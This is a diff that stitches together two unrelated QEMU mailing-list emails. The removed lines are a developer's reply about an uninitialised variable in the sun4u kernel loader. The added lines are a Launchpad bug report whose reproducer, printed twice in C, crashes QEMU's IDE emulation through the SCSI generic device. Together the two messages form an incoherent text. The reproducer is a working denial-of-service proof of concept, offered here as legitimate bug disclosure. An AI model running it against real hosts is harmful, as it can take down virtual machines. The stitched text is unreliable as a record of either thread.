@@ -1,26 +1,32 @@
-Received: from eggs.gnu.org ([2001:4830:134:3::10]:58948)
+Received: from eggs.gnu.org ([2001:4830:134:3::10]:38637)
 	by lists.gnu.org with esmtp (Exim 4.71)
-	(envelope-from <mark.cave-ayland@ilande.co.uk>) id 1fUUpI-00048J-G8
-	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 06:22:29 -0400
+	(envelope-from <bounces@canonical.com>) id 1fUVtO-0004eB-Nr
+	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:30:48 -0400
 Received: from Debian-exim by eggs.gnu.org with spam-scanned (Exim 4.71)
-	(envelope-from <mark.cave-ayland@ilande.co.uk>) id 1fUUpF-0002xK-8I
-	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 06:22:28 -0400
-Received: from chuckie.co.uk ([82.165.15.123]:40718
-	helo=s16892447.onlinehome-server.info)
-	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_256_CBC_SHA1:32)
-	(Exim 4.71) (envelope-from <mark.cave-ayland@ilande.co.uk>)
-	id 1fUUpF-0002v0-1J
-	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 06:22:25 -0400
-References: <40d9df00-f80d-02a4-58ec-b407e7dd8cdb@redhat.com>
-From: Mark Cave-Ayland <mark.cave-ayland@ilande.co.uk>
-Message-ID: <da05f804-31f4-e820-12ed-22a240bf2d07@ilande.co.uk>
-Date: Sun, 17 Jun 2018 11:22:08 +0100
+	(envelope-from <bounces@canonical.com>) id 1fUVtJ-00059m-Ot
+	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:30:46 -0400
+Received: from indium.canonical.com ([91.189.90.7]:51726)
+	by eggs.gnu.org with esmtps (TLS1.0:RSA_AES_128_CBC_SHA1:16)
+	(Exim 4.71) (envelope-from <bounces@canonical.com>)
+	id 1fUVtJ-00058V-Hw
+	for qemu-devel@nongnu.org; Sun, 17 Jun 2018 07:30:41 -0400
+Received: from loganberry.canonical.com ([91.189.90.37])
+	by indium.canonical.com with esmtp (Exim 4.86_2 #2 (Debian))
+	id 1fUVtI-0004V0-I6
+	for <qemu-devel@nongnu.org>; Sun, 17 Jun 2018 11:30:40 +0000
+Received: from loganberry.canonical.com (localhost [127.0.0.1])
+	by loganberry.canonical.com (Postfix) with ESMTP id 7CE1F2E8030
+	for <qemu-devel@nongnu.org>; Sun, 17 Jun 2018 11:30:40 +0000 (UTC)
 MIME-Version: 1.0
-In-Reply-To: <40d9df00-f80d-02a4-58ec-b407e7dd8cdb@redhat.com>
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Language: en-GB
-Content-Transfer-Encoding: 7bit
-Subject: Re: [Qemu-devel] valgrind problem in sun4u_load_kernel()
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Date: Sun, 17 Jun 2018 11:17:15 -0000
+From: icytxw <1777315@bugs.launchpad.net>
+Reply-To: Bug 1777315 <1777315@bugs.launchpad.net>
+Sender: bounces@canonical.com
+Message-Id: <152923423559.26799.9467570390321302567.malonedeb@gac.canonical.com>
+Errors-To: bounces@canonical.com
+Subject: [Qemu-devel] [Bug 1777315] [NEW] Denial of service
 List-Id: <qemu-devel.nongnu.org>
 List-Unsubscribe: <https://lists.nongnu.org/mailman/options/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=unsubscribe>
@@ -29,55 +35,185 @@ List-Post: <mailto:qemu-devel@nongnu.org>
 List-Help: <mailto:qemu-devel-request@nongnu.org?subject=help>
 List-Subscribe: <https://lists.nongnu.org/mailman/listinfo/qemu-devel>,
 	<mailto:qemu-devel-request@nongnu.org?subject=subscribe>
-To: Thomas Huth <thuth@redhat.com>, Artyom Tarasenko <atar4qemu@gmail.com>
-Cc: QEMU Developers <qemu-devel@nongnu.org>
+To: qemu-devel@nongnu.org
 
-On 15/06/18 11:37, Thomas Huth wrote:
+Public bug reported:
 
->   Hi Mark, hi Artyom,
-> 
-> while using valgrind to fix some issues with the rom_ptr() function
-> today, I noticed that there is one more problem in sun4u_load_kernel():
-> The kernel_top variable can be used uninitialized in some cases:
-> If load_elf() fails and the kernel is loaded via load_aout() or
-> load_image_targphys(), the kernel_top variable is never set to a valid
-> value. This could cause some trouble when loading the initrd later. When
-> you've got some spare time, could you please have a look?
+Hi,
+QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-2.=
+12.0
 
-Hmmm that's an interesting one - I'm not immediately aware of any 64-bit 
-kernels that are a.out rather than ELF, so I wonder if this has been 
-used to run a.out executables on startup? Any thoughts, Artyom?
+run the program in qemu-2.12.0:
+#define _GNU_SOURCE =
 
-If this is the case then we can only have a valid kernel_top with an ELF 
-kernel then maybe the following is a good enough solution:
+#include <endian.h>
+#include <sys/syscall.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <stdint.h>
+#include <string.h>
+
+static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
+{
+        if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
+                char buf[128];
+                sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "blo=
+ck", (uint8_t)a1, (uint8_t)a2);
+                return open(buf, O_RDWR, 0);
+        } else {
+                char buf[1024];
+                char* hash;
+strncpy(buf, (char*)a0, sizeof(buf) - 1);
+                buf[sizeof(buf) - 1] =3D 0;
+                while ((hash =3D strchr(buf, '#'))) {
+                        *hash =3D '0' + (char)(a1 % 10);
+                        a1 /=3D 10;
+                }
+                return open(buf, a2, 0);
+        }
+}
+
+uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
+void loop()
+{
+        long res =3D 0;
+memcpy((void*)0x20000000, "/dev/sg#", 9);
+        res =3D syz_open_dev(0x20000000, 0, 2);
+        if (res !=3D -1)
+                r[0] =3D res;
+        res =3D syscall(__NR_dup2, r[0], r[0]);
+        if (res !=3D -1)
+                r[1] =3D res;
+*(uint8_t*)0x20000ec0 =3D 0;
+*(uint8_t*)0x20000ec1 =3D 0;
+*(uint8_t*)0x20000ec2 =3D 0;
+*(uint8_t*)0x20000ec3 =3D 0;
+*(uint32_t*)0x20000ec8 =3D 0;
+*(uint8_t*)0x20000ed8 =3D 0;
+*(uint8_t*)0x20000ed9 =3D 0;
+*(uint8_t*)0x20000eda =3D 0;
+*(uint8_t*)0x20000edb =3D 0;
+memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\xb3=
+", 12);
+        syscall(__NR_write, r[1], 0x20000ec0, 0x323);
+}
+
+int main()
+{
+        syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
+        loop();
+        return 0;
+}
+this will crash qemu, output information:
+ qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =3D=
+=3D s->sg.size' failed.
 
 
-diff --git a/hw/sparc64/sun4u.c b/hw/sparc64/sun4u.c
-index 3975a7b65a..35acf8c96e 100644
---- a/hw/sparc64/sun4u.c
-+++ b/hw/sparc64/sun4u.c
-@@ -139,7 +139,7 @@ static uint64_t sun4u_load_kernel(const char 
-*kernel_filename,
-      unsigned int i;
-      long kernel_size;
-      uint8_t *ptr;
--    uint64_t kernel_top;
-+    uint64_t kernel_top = 0;
+Thanks =
 
-      linux_boot = (kernel_filename != NULL);
+owl337
 
-@@ -172,7 +172,7 @@ static uint64_t sun4u_load_kernel(const char 
-*kernel_filename,
+** Affects: qemu
+     Importance: Undecided
+     Assignee: icytxw (icytxw)
+         Status: New
+
+** Changed in: qemu
+     Assignee: (unassigned) =3D> icytxw (icytxw)
+
+-- =
+
+You received this bug notification because you are a member of qemu-
+devel-ml, which is subscribed to QEMU.
+https://bugs.launchpad.net/bugs/1777315
+
+Title:
+  Denial of service
+
+Status in QEMU:
+  New
+
+Bug description:
+  Hi,
+  QEMU 'hw/ide/core.c:871' Denial of Service Vulnerability in version qemu-=
+2.12.0
+
+  run the program in qemu-2.12.0:
+  #define _GNU_SOURCE =
+
+  #include <endian.h>
+  #include <sys/syscall.h>
+  #include <unistd.h>
+  #include <fcntl.h>
+  #include <stdio.h>
+  #include <string.h>
+  #include <sys/stat.h>
+  #include <stdint.h>
+  #include <string.h>
+
+  static uintptr_t syz_open_dev(uintptr_t a0, uintptr_t a1, uintptr_t a2)
+  {
+          if (a0 =3D=3D 0xc || a0 =3D=3D 0xb) {
+                  char buf[128];
+                  sprintf(buf, "/dev/%s/%d:%d", a0 =3D=3D 0xc ? "char" : "b=
+lock", (uint8_t)a1, (uint8_t)a2);
+                  return open(buf, O_RDWR, 0);
+          } else {
+                  char buf[1024];
+                  char* hash;
+  strncpy(buf, (char*)a0, sizeof(buf) - 1);
+                  buf[sizeof(buf) - 1] =3D 0;
+                  while ((hash =3D strchr(buf, '#'))) {
+                          *hash =3D '0' + (char)(a1 % 10);
+                          a1 /=3D 10;
+                  }
+                  return open(buf, a2, 0);
           }
-          /* load initrd above kernel */
-          *initrd_size = 0;
--        if (initrd_filename) {
-+        if (initrd_filename && kernel_top) {
-              *initrd_addr = TARGET_PAGE_ALIGN(kernel_top);
+  }
 
-              *initrd_size = load_image_targphys(initrd_filename,
+  uint64_t r[2] =3D {0xffffffffffffffff, 0xffffffffffffffff};
+  void loop()
+  {
+          long res =3D 0;
+  memcpy((void*)0x20000000, "/dev/sg#", 9);
+          res =3D syz_open_dev(0x20000000, 0, 2);
+          if (res !=3D -1)
+                  r[0] =3D res;
+          res =3D syscall(__NR_dup2, r[0], r[0]);
+          if (res !=3D -1)
+                  r[1] =3D res;
+  *(uint8_t*)0x20000ec0 =3D 0;
+  *(uint8_t*)0x20000ec1 =3D 0;
+  *(uint8_t*)0x20000ec2 =3D 0;
+  *(uint8_t*)0x20000ec3 =3D 0;
+  *(uint32_t*)0x20000ec8 =3D 0;
+  *(uint8_t*)0x20000ed8 =3D 0;
+  *(uint8_t*)0x20000ed9 =3D 0;
+  *(uint8_t*)0x20000eda =3D 0;
+  *(uint8_t*)0x20000edb =3D 0;
+  memcpy((void*)0x20000ee0, "\x9c\x4d\xe7\xd5\x0a\x62\x43\xa7\x77\x53\x67\x=
+b3", 12);
+          syscall(__NR_write, r[1], 0x20000ec0, 0x323);
+  }
 
+  int main()
+  {
+          syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
+          loop();
+          return 0;
+  }
+  this will crash qemu, output information:
+   qemu-system-x86_64: hw/ide/core.c:843: ide_dma_cb: Assertion `n * 512 =
+=3D=3D s->sg.size' failed.
 
-ATB,
+  =
 
-Mark.
+  Thanks =
+
+  owl337
+
+To manage notifications about this bug go to:
+https://bugs.launchpad.net/qemu/+bug/1777315/+subscriptions
